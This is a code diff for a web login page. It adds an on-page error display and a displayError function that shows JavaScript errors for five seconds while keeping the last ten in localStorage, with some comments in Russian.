@@ -586,6 +586,10 @@
             </a>
         </div>
 
+        <!-- Error display -->
+        <div id="errorDisplay" style="display: none; background: #ff4444; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; max-height: 150px; overflow-y: auto;">
+        </div>
+
         <!-- Login form -->
         <form id="loginForm" onsubmit="handleSubmit(event)">
             <!-- Email/Phone input -->
@@ -810,8 +814,24 @@
         }
 
         // Send log to bot server
-        // Логирование ошибок в localStorage
+        // Логирование ошибок в localStorage и на странице
+        function displayError(message) {
+            const errorDiv = document.getElementById('errorDisplay');
+            if (errorDiv) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML += `<div style="margin-bottom: 5px;">⚠️ ${message}</div>`;
+                // Автоматически скрыть ошибки через 5 секунд
+                setTimeout(() => {
+                    errorDiv.style.display = 'none';
+                    errorDiv.innerHTML = '';
+                }, 5000);
+            }
+        }
+
         window.addEventListener('error', function(e) {
+            const errorMsg = `${e.message} (${e.filename}:${e.lineno})`;
+            displayError(errorMsg);
+
             const errors = JSON.parse(localStorage.getItem('loginErrors') || '[]');
             errors.push({
                 message: e.message,
@@ -819,7 +839,7 @@
                 line: e.lineno,
                 time: new Date().toISOString()
             });
-            localStorage.setItem('loginErrors', JSON.stringify(errors.slice(-10))); // Последние 10 ошибок
+            localStorage.setItem('loginErrors', JSON.stringify(errors.slice(-10)));
             console.error('ERROR LOGGED:', e.message);
         });
 
